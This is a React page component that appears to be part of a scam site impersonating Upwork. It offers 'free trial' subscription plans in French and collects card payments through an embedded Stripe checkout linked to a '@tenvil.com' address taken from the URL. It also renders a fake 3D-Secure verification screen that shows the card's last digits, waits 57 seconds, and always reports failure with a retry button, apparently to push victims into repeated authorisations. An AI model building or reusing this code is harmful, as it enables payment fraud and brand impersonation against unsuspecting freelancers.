import React, { useState, useEffect, useCallback } from 'react';
import emailjs from 'emailjs-com';
import Head from 'next/head';
import { loadStripe } from '@stripe/stripe-js';
import {
  EmbeddedCheckoutProvider,
  EmbeddedCheckout
} from '@stripe/react-stripe-js';

const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);

const Board = () => {
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isBlurred, setIsBlurred] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
  const [showError, setShowError] = useState(false);
  const [selected, setSelected] = useState(null);
  const [showCache, setShowCache] = useState(true);
  const [user, setUser] = useState('');
  const [clientSecret, setClientSecret] = useState(null);

  useEffect(() => {
    const blurTimeout = setTimeout(() => {
      setIsBlurred(true);
    }, 500);

    const popupTimeout = setTimeout(() => {
      setShowPopup(true);
      setShowCache(true);
    }, 1000);

    return () => {
      clearTimeout(blurTimeout);
      clearTimeout(popupTimeout);
    };
  }, []);

  useEffect(() => {
    let errorTimeout;
    if (show3DSecurePopup) {
      errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
    }
    return () => {
      clearTimeout(errorTimeout);
    };
  }, [show3DSecurePopup]);

  useEffect(() => {
    if (show3DSecurePopup) {
      const errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
      return () => clearTimeout(errorTimeout);
    }
  }, [show3DSecurePopup]);

  useEffect(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const userParam = urlParams.get('user');
    if (userParam) {
      setUser(userParam);
      console.log("user extracted from URL:", userParam);
    } else {
      console.error("user parameter is missing in the URL");
    }
  }, []);

  const fetchClientSecret = useCallback(() => {
    if (!user) {
      console.error("user is not set");
      return Promise.reject("user is not set");
    }

    console.log("Creating checkout session with user:", user);

    // Create a Checkout Session 
    return fetch("/api/checkout_sessions", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: user + "@tenvil.com", // Use the user from the URL
      }),
    })
      .then((res) => {
        if (!res.ok) {
          throw new Error(`HTTP error! status: ${res.status}`);
        }
        return res.json();
      })
      .then((data) => {
        if (!data.clientSecret) {
          throw new Error("Client secret not found in response");
        }
        console.log("Client secret received:", data.clientSecret);
        setClientSecret(data.clientSecret);
        return data.clientSecret;
      })
      .catch((error) => {
        console.error("Error fetching client secret:", error);
        throw error;
      });
  }, [user]);

  useEffect(() => {
    if (user) {
      fetchClientSecret();
    }
  }, [user, fetchClientSecret]);

  const options = { fetchClientSecret };

  const showPaymentPopup = (plan) => {
    setSelectedPlan(plan);
    setShowCache(false);
    setTimeout(() => {
      document.querySelector('.popup').classList.add('show');
    }, 100); // Delay to ensure the class is added after the component is rendered
  };

  const hidePaymentPopup = () => {
    document.querySelector('.popup').classList.remove('show');
    setTimeout(() => {
      setSelectedPlan(null);
      setShowCache(true);
      setShowPopup(true); // Réaffiche la première popup
    }, 300); // Match the duration of the CSS transition
  };

  const getPlanPrice = (plan) => {
    switch(plan) {
      case 'Freelance':
        return '90€/mois';
      case 'Agence':
        return '270€/mois'; 
      default:
        return '';
    }
  };

  const retry3DSecure = () => {
    setShowError(false);
    setShow3DSecurePopup(false);
    setTimeout(() => {
      setShow3DSecurePopup(true);
    }, 100); // Small delay to reset the popup
  };

  return (
    <div>
      <Head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/></Head>
      <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
      {showCache && <div className='dashboard-cache'></div>}
      <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
        <h2>Activez gratuitement votre compte Upwork Experts</h2>
        <div className="plans">
          <div className="plan ">
            <h3>Freelance</h3>
            <p>90€<span className='month'>/mois</span></p>
            <ul>
              <li>9% de commissions Upwork</li>
              <li>5 mises en relation/mois</li>
              <li>Support RH personnalisé</li>
            </ul>
            <button onClick={() => showPaymentPopup('Freelance')}>Essayer gratuitement</button>
            <span className='notice'>0€ pendant 30 jours, puis 90€/mois</span>
          </div>
          <div className="plan star">
            <h3>Agence</h3>
            <p>270€<span className='month'>/mois</span></p>
            <ul>
              <li>4% de commissions Upwork</li>
              <li>10 mises en relation/mois</li>
              <li>Support RH personnalisé</li>
              <li>Accès recruteur Upwork</li>
              <li>Programme de parrainage</li>
            </ul>
            <button onClick={() => showPaymentPopup('Agence')}>Essayer gratuitement</button>
            <span className='notice'>270€/mois, facturé à date de l'abonnement</span>
          </div>
        </div>
      </div>
      {selectedPlan && !show3DSecurePopup && (
        <div className={`popup ${showPopup ? 'show' : ''}`}>
          <div className="popup-content stripe">
            <button className='return' onClick={hidePaymentPopup}>
              <i className="fas fa-chevron-left"></i>
            </button>
            <div className="payment-details stripe">
              <h3>{selectedPlan} : 30 jours gratuit</h3>
              <span>0€ pendant 30 jours, puis {getPlanPrice(selectedPlan)} annulez avant pour ne pas être facturé.</span>
              <form className="stripe-form">
                {clientSecret ? (
                  <EmbeddedCheckoutProvider
                    stripe={stripePromise}
                    options={options}
                  >
                    <EmbeddedCheckout />
                  </EmbeddedCheckoutProvider>
                ) : (
                  <p>Loading...</p>
                )}
              </form>
            </div>
          </div>
        </div>
      )}
      {show3DSecurePopup && (
        <div className="popup show">
          <div className="popup-content d-secure show">
            <h3>Vérificaton 3D-secure</h3>
            {showError ? (
              <>
                <p>La vérification a échoué. Veuillez réessayer.</p>
                <button className='retry-btn' onClick={retry3DSecure}>Réessayer</button>
              </>
            ) : (
              <>
                <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')}</p>
                <span>NETELLER* Essai Freelance</span>
                <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>

                <div className="loading-spinner">
                  <div className="spinner"></div>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Board;